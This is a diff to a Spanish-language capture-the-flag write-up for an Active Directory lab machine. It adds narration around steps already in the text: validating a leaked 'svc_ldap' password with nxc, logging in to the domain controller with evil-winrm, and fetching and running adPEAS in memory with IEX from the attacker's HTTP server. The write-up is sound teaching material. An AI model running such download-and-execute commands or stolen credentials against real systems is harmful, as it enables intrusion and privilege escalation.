@@ -613,7 +613,7 @@ Obtenemos el mismo resultado capturando el protocolo `LDAP` a través de `Wiresh
 
 Verificamos que las credenciales obtenidas del usuario `svc_ldap` son válidas y también que nos podemos conectar remotamente al Domain Controller.
 
-Al acceder a través de `evil-winrm` al DC, hemos logrado acceder y&#x20;
+Al acceder a través de `evil-winrm` al DC, hemos logrado acceder y obtener la flag **root.txt**.
 
 ```bash
 ❯ nxc smb 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
@@ -639,7 +639,9 @@ Info: Establishing connection to remote endpoint
 
 ### DC Enumeration (adPEAS) - Powershell tool to automate Active Directory enumeration
 
-Debido que nos encont
+Debido que nos encontramos en un Domain Controller, haremos una enumeración a través de `adPEAS` que es una herramienta automatizada para realizar un escaneo en Active Directory en busca de encontrar alguna de escalar privilegios.
+
+Para ello nos descargaremos en nuestro equipo el `adPEAS` y lo compartiremos a través de un servidor web.
 
 ```bash
 ❯ wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
@@ -658,14 +660,14 @@ adPEAS.ps1                                                100%[=================
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el Domain Controller, importaremos en memoria el `adPEAS` y lo invocaremos para realizar el análisis.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> IEX(New-Object Net.WebClient).downloadString("http://10.10.16.3/adPEAS.ps1")
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-adPEAS
 ```
 
-
+En el resultado obtenido, nos encontramos que ha encontrado una escalada de privilegios relacionada con los `Active Directory Certificate Services` (ADCS).
 
 ```powershell
 [?] +++++ Searching for Active Directory Certificate Services Information +++++
